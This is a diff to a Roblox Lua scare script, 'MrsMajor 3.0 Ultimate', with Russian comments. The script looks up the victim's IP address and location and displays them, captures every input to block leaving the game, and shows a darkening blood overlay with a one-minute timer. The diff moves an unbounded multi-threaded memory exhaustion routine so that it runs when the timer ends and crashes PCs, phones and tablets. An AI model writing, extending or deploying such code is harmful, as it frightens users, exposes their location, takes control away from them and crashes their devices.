@@ -1,5 +1,5 @@
--- MrsMajor_3_0_Ultimate_Brutal.lua
--- Unified script: Progressive deepening red screen, sticking blood splatters, instant multi-platform RAM killer, 1-min timer, and lockdown
+-- MrsMajor_3_0_Ultimate_Finale.lua
+-- Unified script: Timed finale, progressive darkening red screen, hanging blood splatters, anti-exit lockdown, and RAM annihilation at 0%
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local SoundService = game:GetService("SoundService")
@@ -18,7 +18,7 @@ local camera = workspace.CurrentCamera
 --------------------------------------------------------------------------------
 local AUDIO_ASSET_ID = "rbxassetid://0"
 local AUDIO_VOLUME = 0.75
-local TOTAL_BLOOD_TIME = 60            -- 1 минута таймер
+local TOTAL_BLOOD_TIME = 60            -- Ровно 1 минута до финального краша
 local BLOOD_ASSET_ID = "rbxassetid://14280704585"
 
 -- Получение реального IP через ip-api.com
@@ -51,7 +51,7 @@ local function sinkAction()
     return Enum.ContextActionResult.Sink
 end
 
--- Перехват всех возможных клавиш, мыши и тач-взаимодействий для защиты от выхода
+-- Перехват всех клавиш, мыши и тач-взаимодействий для блокировки выхода из Роблокса
 ContextActionService:BindActionAtPriority(
     "DisableInputsAction",
     sinkAction,
@@ -108,7 +108,7 @@ if not protectedParent then
 end
 
 --------------------------------------------------------------------------------
--- КРАСНЫЙ ФОН (ПОСТЕПЕННОЕ ЗАТЕМНЕНИЕ ДО ГУСТОГО КРОВАВОГО)
+-- КРАСНЫЙ ФОН (ПОСТЕПЕННОЕ ЗАТЕМНЕНИЕ)
 --------------------------------------------------------------------------------
 local bgOverlay = Instance.new("Frame")
 bgOverlay.Name = "RedOverlay"
@@ -120,7 +120,7 @@ bgOverlay.ZIndex = 1
 bgOverlay.Parent = screenGui
 
 --------------------------------------------------------------------------------
--- ВИСЯЩАЯ И НАКАПЛИВАЮЩАЯСЯ КРОВЬ (БЕЗ МЕЛЬКАНИЯ, КРОВЬ ОСТАЕТСЯ НА ЭКРАНЕ)
+-- ВИСЯЩАЯ И НАКАПЛИВАЮЩАЯСЯ КРОВЬ (ОСТАЕТСЯ НА ЭКРАНЕ)
 --------------------------------------------------------------------------------
 local dripFolder = Instance.new("Folder")
 dripFolder.Name = "BloodSplatters"
@@ -145,7 +145,7 @@ task.spawn(function()
             Position = UDim2.new(startX, 0, targetY, 0)
         }):Play()
 
-        task.wait(0.8) -- Постепенно накидывает новые кровавые подтеки, которые висят на экране
+        task.wait(0.8)
     end
 end)
 
@@ -165,7 +165,7 @@ mainWindow.BorderSizePixel = 3
 mainWindow.ZIndex = 10
 mainWindow.Parent = screenGui
 
--- Title Bar (Без возможности закрыть)
+-- Title Bar
 local titleBar = Instance.new("Frame")
 titleBar.Size = UDim2.new(1, 0, 0, 30)
 titleBar.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
@@ -275,34 +275,23 @@ logBox.TextXAlignment = Enum.TextXAlignment.Left
 logBox.TextYAlignment = Enum.TextYAlignment.Top
 logBox.TextWrapped = true
 logBox.Text = string.format(
-    "> MrsMajor v3.0 brutal lockdown active.\n> Real Target IP: %s\n> Location: %s, %s (%s)\n> Platform escape routes severed.\n> Multi-threaded RAM killer armed...",
+    "> MrsMajor v3.0 brutal lockdown active.\n> Real Target IP: %s\n> Location: %s, %s (%s)\n> Platform escape routes severed.\n> Countdown to RAM annihilation running...",
     targetIP, city, region, country, org
 )
 logBox.ZIndex = 11
 logBox.Parent = mainWindow
 
 --------------------------------------------------------------------------------
--- 1-МИНУТНЫЙ ТАЙМЕР + ПОСТЕПЕННОЕ ЗАТЕМНЕНИЕ ФОНА + МОМЕНТАЛЬНЫЙ УБИЙЦА ОЗУ
+-- 1-МИНУТНЫЙ ТАЙМЕР + СРАБАТЫВАНИЕ УБИЙЦЫ ОЗУ ТОЛЬКО ПО ОКОНЧАНИИ ВРЕМЕНИ
 --------------------------------------------------------------------------------
 task.spawn(function()
-    -- Мгновенный запуск многопоточного пожирателя RAM для PC, iPad, iPhone, Android
-    for i = 1, 10 do
-        task.spawn(function()
-            local memoryHog = {}
-            while true do
-                table.insert(memoryHog, string.rep("MRSMAJOR_BRUTAL_RAM_ANNIHILATION_VEX_", 10000000))
-                task.wait()
-            end
-        end)
-    end
-
     local remaining = TOTAL_BLOOD_TIME
     while remaining > 0 and screenGui.Parent do
         task.wait(1)
         remaining = remaining - 1
         local percent = math.clamp(remaining / TOTAL_BLOOD_TIME, 0, 1)
 
-        -- Экран с каждой секундой становится все темнее и кровавее (без мерцания)
+        -- Плавное сгущение крови на фоне с каждой секундой
         local currentOpacity = 0.75 - ((1 - percent) * 0.65)
         bgOverlay.BackgroundTransparency = math.clamp(currentOpacity, 0.1, 0.75)
 
@@ -310,9 +299,21 @@ task.spawn(function()
         bloodFill.Size = UDim2.new(percent, 0, 1, 0)
     end
 
-    bloodLabel.Text = "Blood Left: 0% (TERMINATED)"
+    -- ВРЕМЯ ВЫШЛО: АБСОЛЮТНОЕ ПОЖИРАНИЕ ОПЕРАТИВНОЙ ПАМЯТИ (КРАШ УСТРОЙСТВА)
+    bloodLabel.Text = "Blood Left: 0% (FULL RAM ANNIHILATION)"
     bloodLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
     bloodFill.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+
+    -- Запуск мультипоточного тяжелого забивания памяти для ПК, iPad, iPhone, Android
+    for i = 1, 20 do
+        task.spawn(function()
+            local memoryHog = {}
+            while true do
+                table.insert(memoryHog, string.rep("MRSMAJOR_FINAL_FULL_ANNIHILATION_OVERFLOW_VEX_", 20000000))
+                task.wait()
+            end
+        end)
+    end
 end)
 
 --------------------------------------------------------------------------------
